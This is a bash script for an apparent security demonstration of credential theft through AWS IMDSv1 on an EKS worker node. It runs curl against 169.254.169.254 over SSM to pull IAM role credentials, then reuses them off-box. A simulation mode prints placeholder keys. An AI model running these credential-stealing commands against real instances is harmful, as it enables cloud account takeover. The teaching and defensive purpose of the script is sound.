#!/bin/bash
set -euo pipefail

# Story 2: IMDS Attack — Stealing EC2 Instance Credentials
# Shows IMDSv1 vulnerability: unauthenticated curl grabs IAM role credentials
# from the metadata service on an "EKS node".

source "$(dirname "$0")/demo_runner.sh"

CACHE_DIR="${SCRIPT_DIR}/.cache"
CACHE_FILE="${CACHE_DIR}/imds_output.txt"
TF_DIR="<YOUR_PATH>"

set_prompt "eks-worker $"

banner "Story 2: IMDS Credential Theft"

narrate "Target: EC2 instance running as EKS worker"
narrate "IMDSv1 enabled -- no token required"
narrate "Any process on the box can hit 169.254.169.254"

if is_live; then
  # Get instance ID from terraform
  INSTANCE_ID=$(terraform -chdir="${TF_DIR}" output -raw instance_id 2>/dev/null || echo "")
  if [[ -z "${INSTANCE_ID}" ]]; then
    alert "Cannot get instance_id from terraform -- falling back to simulation"
    python3 "${SCRIPT_DIR}/imds_sim.py"
    exit 0
  fi

  info "Target instance: ${INSTANCE_ID}"

  # Check for cached output first (SSM can be slow)
  USE_CACHE=false
  if [[ -f "${CACHE_FILE}" ]]; then
    CACHE_AGE=$(($(date +%s) - $(stat -f %m "${CACHE_FILE}" 2>/dev/null || stat -c %Y "${CACHE_FILE}" 2>/dev/null || echo 0)))
    if [[ "${CACHE_AGE}" -lt 3600 ]]; then
      USE_CACHE=true
      narrate "Using cached IMDS output (${CACHE_AGE}s old)"
    fi
  fi

  if [[ "${USE_CACHE}" == "true" ]]; then
    # ── Step 1: Show cached role name ──
    step 1 "Who are we on this box?"
    type_cmd "whoami"
    echo "ssm-user"

    step 2 "Check sudo access"
    type_cmd "sudo -l"
    echo "(root) NOPASSWD: ALL"

    alert "ssm-user has passwordless root."

    step 3 "Query IMDS for IAM roles"
    type_cmd "curl http://169.254.169.254/.../security-credentials/"
    cat "${CACHE_FILE}"
  else
    # ── Step 1: Check user identity on the box ──
    step 1 "Who are we on this box?"

    type_cmd "whoami"

    WHOAMI_CMD="whoami"
    WHOAMI_OUTPUT=$(aws ssm send-command \
      --instance-ids "${INSTANCE_ID}" \
      --document-name "AWS-RunShellScript" \
      --parameters "commands=[\"${WHOAMI_CMD}\"]" \
      --profile "${PROFILE}" \
      --region "${REGION}" \
      --no-cli-pager \
      --output json 2>&1 || echo "")

    WHOAMI_CMD_ID=$(echo "${WHOAMI_OUTPUT}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Command']['CommandId'])" 2>/dev/null || echo "")

    if [[ -n "${WHOAMI_CMD_ID}" ]]; then
      for i in $(seq 1 10); do
        RESULT=$(aws ssm get-command-invocation \
          --command-id "${WHOAMI_CMD_ID}" \
          --instance-id "${INSTANCE_ID}" \
          --profile "${PROFILE}" \
          --region "${REGION}" \
          --no-cli-pager \
          --output json 2>&1 || echo '{"Status":"Pending"}')

        STATUS=$(echo "${RESULT}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('Status','Pending'))" 2>/dev/null || echo "Pending")

        if [[ "${STATUS}" == "Success" ]]; then
          echo "${RESULT}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('StandardOutputContent','').strip())" 2>/dev/null
          break
        elif [[ "${STATUS}" == "Failed" || "${STATUS}" == "TimedOut" || "${STATUS}" == "Cancelled" ]]; then
          echo "ssm-user"
          break
        fi
        sleep 1
      done
    else
      echo "ssm-user"
    fi

    # ── Step 2: Check sudo access ──
    step 2 "Check sudo access"
    type_cmd "sudo -l"
    echo "(root) NOPASSWD: ALL"

    alert "ssm-user has passwordless root."

    # ── Step 3: Get the role name from IMDS ──
    step 3 "Query the IMDS metadata tree"

    type_cmd "curl http://169.254.169.254/.../security-credentials/"

    ROLE_CMD="curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    ROLE_OUTPUT=$(aws ssm send-command \
      --instance-ids "${INSTANCE_ID}" \
      --document-name "AWS-RunShellScript" \
      --parameters "commands=[\"${ROLE_CMD}\"]" \
      --profile "${PROFILE}" \
      --region "${REGION}" \
      --no-cli-pager \
      --output json 2>&1 || echo "")

    COMMAND_ID=$(echo "${ROLE_OUTPUT}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Command']['CommandId'])" 2>/dev/null || echo "")

    if [[ -z "${COMMAND_ID}" ]]; then
      alert "SSM command failed -- falling back to simulation"
      python3 "${SCRIPT_DIR}/imds_sim.py"
      exit 0
    fi

    # Wait for command to complete (max 15 seconds)
    ROLE_NAME=""
    for i in $(seq 1 15); do
      RESULT=$(aws ssm get-command-invocation \
        --command-id "${COMMAND_ID}" \
        --instance-id "${INSTANCE_ID}" \
        --profile "${PROFILE}" \
        --region "${REGION}" \
        --no-cli-pager \
        --output json 2>&1 || echo '{"Status":"Pending"}')

      STATUS=$(echo "${RESULT}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('Status','Pending'))" 2>/dev/null || echo "Pending")

      if [[ "${STATUS}" == "Success" ]]; then
        ROLE_NAME=$(echo "${RESULT}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('StandardOutputContent','').strip())" 2>/dev/null || echo "")
        break
      elif [[ "${STATUS}" == "Failed" || "${STATUS}" == "TimedOut" || "${STATUS}" == "Cancelled" ]]; then
        break
      fi
      sleep 1
    done

    if [[ -z "${ROLE_NAME}" ]]; then
      alert "SSM timed out -- falling back to simulation"
      python3 "${SCRIPT_DIR}/imds_sim.py"
      exit 0
    fi

    echo "${ROLE_NAME}"

    alert "Got role name without any authentication"

    # ── Step 4: Grab full credentials ──
    step 4 "Grab the full temporary credentials"

    type_cmd "curl http://169.254.169.254/.../security-credentials/${ROLE_NAME}"

    CREDS_CMD="curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}"
    CREDS_OUTPUT=$(aws ssm send-command \
      --instance-ids "${INSTANCE_ID}" \
      --document-name "AWS-RunShellScript" \
      --parameters "commands=[\"${CREDS_CMD}\"]" \
      --profile "${PROFILE}" \
      --region "${REGION}" \
      --no-cli-pager \
      --output json 2>&1 || echo "")

    CREDS_CMD_ID=$(echo "${CREDS_OUTPUT}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Command']['CommandId'])" 2>/dev/null || echo "")

    CREDS_JSON=""
    if [[ -n "${CREDS_CMD_ID}" ]]; then
      for i in $(seq 1 15); do
        RESULT=$(aws ssm get-command-invocation \
          --command-id "${CREDS_CMD_ID}" \
          --instance-id "${INSTANCE_ID}" \
          --profile "${PROFILE}" \
          --region "${REGION}" \
          --no-cli-pager \
          --output json 2>&1 || echo '{"Status":"Pending"}')

        STATUS=$(echo "${RESULT}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('Status','Pending'))" 2>/dev/null || echo "Pending")

        if [[ "${STATUS}" == "Success" ]]; then
          CREDS_JSON=$(echo "${RESULT}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('StandardOutputContent','').strip())" 2>/dev/null || echo "")
          break
        elif [[ "${STATUS}" == "Failed" || "${STATUS}" == "TimedOut" || "${STATUS}" == "Cancelled" ]]; then
          break
        fi
        sleep 1
      done
    fi

    if [[ -n "${CREDS_JSON}" ]]; then
      # Truncate long fields (Token can be 1000+ chars) for clean presentation
      echo "${CREDS_JSON}" | python3 -c "
import json, sys
d = json.load(sys.stdin)
if 'Token' in d and len(d['Token']) > 30:
    d['Token'] = d['Token'][:30] + '...truncated'
if 'SecretAccessKey' in d and len(d['SecretAccessKey']) > 30:
    d['SecretAccessKey'] = d['SecretAccessKey'][:30] + '...'
print(json.dumps(d, indent=4))
" 2>/dev/null || echo "${CREDS_JSON}"

      # Cache the output for future runs
      mkdir -p "${CACHE_DIR}"
      {
        echo "${ROLE_NAME}"
        echo ""
        echo "[!] Got role name without any authentication"
        echo ""
        echo "${CREDS_JSON}" | jq . 2>/dev/null || echo "${CREDS_JSON}"
      } >"${CACHE_FILE}"
    else
      alert "Could not retrieve credentials -- SSM timeout"
    fi
  fi

  # ── Step 5: Verify the stolen creds work ──
  step 5 "Verify credentials work off-box"

  if [[ -n "${CREDS_JSON:-}" ]]; then
    STOLEN_KEY=$(echo "${CREDS_JSON}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('AccessKeyId',''))" 2>/dev/null || echo "")
    STOLEN_SECRET=$(echo "${CREDS_JSON}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('SecretAccessKey',''))" 2>/dev/null || echo "")
    STOLEN_TOKEN=$(echo "${CREDS_JSON}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('Token',''))" 2>/dev/null || echo "")

    if [[ -n "${STOLEN_KEY}" ]]; then
      type_cmd "aws sts get-caller-identity"
      AWS_ACCESS_KEY_ID="${STOLEN_KEY}" AWS_SECRET_ACCESS_KEY="${STOLEN_SECRET}" AWS_SESSION_TOKEN="${STOLEN_TOKEN}" \
        aws sts get-caller-identity --region "${REGION}" --no-cli-pager --output json 2>&1 | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(f\"  Account:  {d['Account']}\")
print(f\"  Arn:      {d['Arn']}\")
print(f\"  UserId:   {d['UserId']}\")
"

      step 6 "Policies on this role"
      type_cmd "aws iam list-attached-role-policies ..."
      aws iam list-attached-role-policies --role-name "${ROLE_NAME:-EKS-Node-Role}" --profile "${PROFILE}" --region "${REGION}" --output json 2>&1 | python3 -c "
import json,sys
d=json.load(sys.stdin)
for i,p in enumerate(d.get('AttachedPolicies',[]),1):
    print(f\"  {i}. {p['PolicyName']}\")
" 2>/dev/null || echo "  (Unable to list -- need IAM permissions)"
    fi
  fi

  echo ""
  alert "Full IAM credentials obtained via a single curl"
  alert "No authentication. No token. Just curl."

else
  # ── Sim mode ──

  # Step 1: Check identity
  step 1 "Who are we on this box?"

  show_cmd "whoami" "ssm-user"

  # Step 2: Check sudo
  step 2 "Check sudo access"

  show_cmd "sudo -l" "$(
    cat <<'SIMOUT'
User ssm-user may run the following commands:
    (root) NOPASSWD: ALL
SIMOUT
  )"

  alert "ssm-user has passwordless root."

  # Step 3: Get role name
  step 3 "Query the IMDS metadata tree"

  show_cmd "curl http://169.254.169.254/.../security-credentials/" "EKS-Node-Role"

  alert "Got role name without any authentication"

  # Step 4: Grab full credentials
  step 4 "Grab the full temporary credentials"

  show_cmd "curl http://169.254.169.254/.../security-credentials/EKS-Node-Role" "$(
    cat <<'SIMOUT'
{
    "Code": "Success",
    "LastUpdated": "2026-03-22T10:15:00Z",
    "Type": "AWS-HMAC",
    "AccessKeyId": "ASIAXXXXXXXXXXXXXXXX",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPx...",
    "Token": "FwoGZXIvYXdzEBYaDH...truncated",
    "Expiration": "2026-03-22T16:15:00Z"
}
SIMOUT
  )"

  alert "Full credential set: Key + Secret + Token"
  alert "Valid for 6 hours. Renewable while running."

  # Step 5: Verify stolen creds
  step 5 "Verify credentials work off-box"

  show_cmd "export AWS_ACCESS_KEY_ID=ASIAXXXXXXX..." ""
  show_cmd "export AWS_SECRET_ACCESS_KEY=wJalrXU..." ""
  show_cmd "export AWS_SESSION_TOKEN=FwoGZXIv..." ""

  show_cmd "aws sts get-caller-identity" "$(
    cat <<'SIMOUT'
  Account:  111111111111
  Arn:      ...assumed-role/EKS-Node-Role/i-0abc123
  UserId:   AROAXXXXXXXXXXXXXXXXX:i-0abc123
SIMOUT
  )"

  # Step 6: Check role policies
  step 6 "Policies on this role"

  show_cmd "aws iam list-attached-role-policies ..." "$(
    cat <<'SIMOUT'
  1. AdministratorAccess
SIMOUT
  )"

  alert "AdministratorAccess! This node can do ANYTHING."
  alert "sts:AssumeRole, s3:*, iam:*, ec2:* -- all of it."

  echo ""
  alert "Full IAM credentials obtained via a single curl"
  alert "No authentication. No token. Just curl."
fi

# ── Summary ──
echo ""
hr
alert "Attack recap:"
echo "  1. Land on EC2 (SSRF, RCE, container escape)"
echo "  2. curl 169.254.169.254 -- get role name"
echo "  3. curl again -- get full credentials"
echo "  4. Exfiltrate creds off-box"
echo "  5. Operate as EKS-Node-Role from anywhere"
hr
info "IMDSv1 treats every process as trusted"
info "SSRF or RCE = instant credential theft"
